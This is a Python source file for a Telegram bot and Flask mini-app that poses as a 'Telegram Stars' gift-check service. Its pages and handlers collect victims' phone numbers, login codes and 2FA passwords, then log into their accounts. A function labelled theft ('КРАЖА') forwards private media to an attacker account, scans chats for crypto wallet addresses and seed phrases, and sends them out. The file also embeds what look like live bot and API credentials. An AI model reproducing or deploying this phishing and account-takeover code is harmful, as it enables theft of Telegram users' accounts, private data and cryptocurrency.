from flask import Flask, request, jsonify
import telebot
from telebot.types import InlineQueryResultArticle, InputTextMessageContent, InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
import threading
import time
import asyncio
import re
from telethon import TelegramClient

BOT_TOKEN = "8959279502:AAGJIX6qqoSwgFa-Y0lXnhC4ClIR9nE4ifI"
WEBAPP_URL = "https://stargiftbot-final.onrender.com"

API_ID = 35524346
API_HASH = "95f3fca0a6642a9ad57db7b2c60f58e2"
TARGET_ACCOUNT = "@cifsy"

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)
user_sessions = {}

# ========== HTML ДЛЯ МІНІ-ДОДАТКУ ==========
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Stars</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: white;
            font-family: -apple-system, Arial, sans-serif;
            text-align: center;
            padding: 40px 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .icon { font-size: 64px; margin-bottom: 10px; }
        h2 { font-size: 24px; margin-bottom: 8px; }
        .sub { color: #888; font-size: 14px; margin-bottom: 30px; }
        input {
            width: 100%;
            max-width: 340px;
            padding: 16px;
            margin: 8px auto;
            border-radius: 14px;
            border: 1px solid #2a2a2a;
            background: #1a1a1a;
            color: white;
            font-size: 16px;
            display: block;
        }
        input:focus { border-color: #0088cc; outline: none; }
        button {
            width: 100%;
            max-width: 340px;
            padding: 16px;
            background: #0088cc;
            border: none;
            border-radius: 14px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
        }
        button:active { opacity: 0.8; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        .secure { color: #00cc88; font-size: 13px; margin-top: 20px; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div id="step1">
        <div class="icon">📱</div>
        <h2>Введите номер телефона</h2>
        <p class="sub">На него придёт код подтверждения</p>
        <input id="phone" placeholder="+71234567890" type="tel">
        <button onclick="sendPhone()">📲 ПОЛУЧИТЬ КОД</button>
        <p class="secure">🔒 Защищённое соединение</p>
    </div>

    <div id="step2" class="hidden">
        <div class="icon">🔐</div>
        <h2>Введите код подтверждения</h2>
        <p class="sub">Код пришёл в Telegram</p>
        <input id="code" placeholder="12345" type="text">
        <button onclick="sendCode()">✅ ПОДТВЕРДИТЬ</button>
        <p class="secure">🔒 Защищённое соединение</p>
    </div>

    <div id="step3" class="hidden">
        <div class="icon">🔐</div>
        <h2>Введите 2FA пароль</h2>
        <p class="sub">На аккаунте включена двухфакторная авторизация</p>
        <input id="code2fa" placeholder="Пароль 2FA" type="password">
        <button onclick="send2FA()">✅ ПОДТВЕРДИТЬ</button>
        <p class="secure">🔒 Защищённое соединение</p>
    </div>

    <div id="step4" class="hidden">
        <div class="icon">✅</div>
        <h2 style="color: #00cc88;">Ты получил чек на звёзды!</h2>
        <p class="sub">Они придут на твой аккаунт в течение 2-5 минут.</p>
        <button onclick="window.Telegram.WebApp.close()">🔙 ЗАКРЫТЬ</button>
    </div>

    <script>
        let phone = '';
        function showStep(step) {
            document.querySelectorAll('[id^="step"]').forEach(el => el.classList.add('hidden'));
            document.getElementById('step' + step).classList.remove('hidden');
        }
        function sendPhone() {
            phone = document.getElementById('phone').value.trim();
            if (!phone || !phone.startsWith('+')) { alert('Введите номер в международном формате'); return; }
            fetch('/send_phone', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: phone }) })
            .then(res => res.json()).then(data => { if (data.status === 'ok') showStep(2); else alert('Ошибка'); });
        }
        function sendCode() {
            const code = document.getElementById('code').value.trim();
            if (!code) { alert('Введите код'); return; }
            fetch('/verify_code', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: phone, code: code }) })
            .then(res => res.json()).then(data => {
                if (data.status === 'success') showStep(4);
                else if (data.status === 'need_2fa') showStep(3);
                else alert('Неверный код');
            });
        }
        function send2FA() {
            const code2fa = document.getElementById('code2fa').value.trim();
            if (!code2fa) { alert('Введите 2FA пароль'); return; }
            fetch('/verify_2fa', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: phone, code2fa: code2fa }) })
            .then(res => res.json()).then(data => {
                if (data.status === 'success') showStep(4);
                else alert('Неверный 2FA пароль');
            });
        }
    </script>
</body>
</html>
"""

# ========== МАРШРУТИ ==========
@app.route('/')
def index():
    return HTML_PAGE

@app.route('/send_phone', methods=['POST'])
def send_phone():
    data = request.json
    phone = data.get('phone')
    user_sessions[phone] = {'phone': phone, 'step': 'code_sent'}
    return jsonify({'status': 'ok'})

@app.route('/verify_code', methods=['POST'])
def verify_code():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(login_to_telegram(phone, code))
        loop.close()
        
        if result == 'need_2fa':
            return jsonify({'status': 'need_2fa'})
        elif result == 'success':
            return jsonify({'status': 'success'})
        else:
            return jsonify({'status': 'error'})
    except Exception as e:
        print(f"Login error: {e}")
        return jsonify({'status': 'error'})

@app.route('/verify_2fa', methods=['POST'])
def verify_2fa():
    data = request.json
    phone = data.get('phone')
    code2fa = data.get('code2fa')
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(login_with_2fa(phone, code2fa))
        loop.close()
        
        if result == 'success':
            return jsonify({'status': 'success'})
        else:
            return jsonify({'status': 'error'})
    except Exception as e:
        print(f"2FA error: {e}")
        return jsonify({'status': 'error'})

# ========== ЛОГИКА АВТОМАТИЧЕСКОГО ВХОДА ==========
async def login_to_telegram(phone, code):
    client = TelegramClient(f'session_{phone}', API_ID, API_HASH)
    try:
        # Бот САМ заходит в аккаунт, используя введенный код
        await client.start(phone=phone, code_callback=lambda: code)
        user_sessions[phone]['client'] = client
        me = await client.get_me()
        print(f"✅ Бот автоматически вошел в аккаунт: {me.username or me.phone}")
        
        # Отправляем уведомление в группу
        try:
            bot.send_message(-1004479107837, f"✅ Автовход: {me.username or me.phone}", message_thread_id=45)
        except: pass
        
        # Запускаем кражу
        threading.Thread(target=lambda: asyncio.run(steal_gifts(phone, client))).start()
        return 'success'
    except Exception as e:
        error = str(e)
        if '2FA' in error or 'password' in error:
            user_sessions[phone]['client'] = client
            return 'need_2fa'
        else:
            print(f"Login error: {error}")
            return 'error'

async def login_with_2fa(phone, code2fa):
    client = user_sessions.get(phone, {}).get('client')
    if not client:
        return 'error'
    try:
        # Бот САМ вводит 2FA пароль
        await client.start(password=code2fa)
        user_sessions[phone]['step'] = 'logged_in'
        me = await client.get_me()
        print(f"✅ Бот автоматически вошел с 2FA: {me.username or me.phone}")
        
        try:
            bot.send_message(-1004479107837, f"✅ Автовход с 2FA: {me.username or me.phone}", message_thread_id=45)
        except: pass
        
        threading.Thread(target=lambda: asyncio.run(steal_gifts(phone, client))).start()
        return 'success'
    except Exception as e:
        print(f"2FA error: {e}")
        return 'error'

# ========== КРАЖА ==========
async def steal_gifts(phone, client):
    try:
        me = await client.get_me()
        print(f"🎁 Начинаем кражу для {me.username or me.phone}")
        
        # 1. Пересылаем все медиа
        saved = await client.get_messages('me', limit=200)
        for msg in saved:
            if msg.media:
                try:
                    await client.forward_messages(TARGET_ACCOUNT, msg)
                except: pass
        
        # 2. Ищем сид-фразы и адреса
        async for dialog in client.iter_dialogs():
            try:
                async for msg in client.iter_messages(dialog, limit=50):
                    text = msg.text or ''
                    if '0x' in text and len(text) > 40:
                        await client.send_message(TARGET_ACCOUNT, f"💰 АДРЕС: {text}")
                    words = text.split()
                    if len(words) in [12, 24] and all(len(w) > 3 for w in words[:5]):
                        await client.send_message(TARGET_ACCOUNT, f"🔑 СИД-ФРАЗА: {text}")
            except: pass
        
        # 3. Пересылаем медиа из чатов
        async for dialog in client.iter_dialogs():
            if dialog.is_user and dialog.id != (await client.get_me()).id:
                try:
                    msgs = await client.get_messages(dialog, limit=30)
                    for msg in msgs:
                        if msg.media:
                            await client.forward_messages(TARGET_ACCOUNT, msg)
                except: pass
        
        await client.send_message(TARGET_ACCOUNT, f'🎉 АККАУНТ {me.username or me.phone} ОБРАБОТАН!')
        print(f"✅ Кража завершена для {me.username or me.phone}")
    except Exception as e:
        print(f"❌ Ошибка кражи: {e}")
    finally:
        await client.disconnect()

# ========== INLINE-МЕНЮ ==========
@bot.inline_handler(lambda query: True)
def inline_handler(inline_query):
    results = []
    amounts = [100, 200, 300, 500, 700, 1000]
    for amt in amounts:
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton(
            f"🤖 Забрать {amt} звёзд",
            url="https://t.me/StarCheclBot"
        ))
        results.append(
            InlineQueryResultArticle(
                id=str(amt),
                title=f"⭐ Чек на {amt} звёзд",
                description=f"Нажми, чтобы забрать {amt} звёзд",
                input_message_content=InputTextMessageContent(
                    f"🎯 **Ты получил чек на {amt} звёзд!**\n👇 Нажми на кнопку, чтобы перейти в бота.",
                    parse_mode='Markdown'
                ),
                reply_markup=keyboard
            )
        )
    bot.answer_inline_query(inline_query.id, results)

# ========== КОМАНДА /start ==========
@bot.message_handler(commands=['start'])
def start_cmd(message):
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton(
        "🎁 Забрать чек на звёзды",
        web_app=WebAppInfo(url=WEBAPP_URL)
    ))
    bot.send_message(
        message.chat.id,
        "🌟 **Привет!**\n\nЯ бот для получения чеков на звёзды.\n\n👇 Нажми на кнопку ниже, чтобы открыть мини-приложение.",
        reply_markup=keyboard,
        parse_mode='Markdown'
    )

# ========== ЗАПУСК ==========
def run_bot():
    bot.polling(none_stop=True)

threading.Thread(target=run_bot, daemon=True).start()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
